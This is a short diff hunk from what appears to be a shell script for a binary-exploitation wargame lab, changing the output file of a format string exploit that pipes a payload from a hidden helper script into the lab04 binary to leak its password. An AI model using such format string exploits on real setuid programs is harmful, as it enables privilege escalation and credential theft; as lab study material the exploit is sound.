@@ -44,7 +44,7 @@ EOF
 # to the password buffer
 
 # Now we can use our script to build our format string exploit and read the password
-passfile=/tmp/lab4C.pass
+passfile=/tmp/lab4B.pass
 
 echo $(python /tmp/.formatit.py "0x12" $pass | /levels/lab04/lab4C | tail -n1 | cut -d" " -f1) > $passfile
 echo Password stored in $passfile
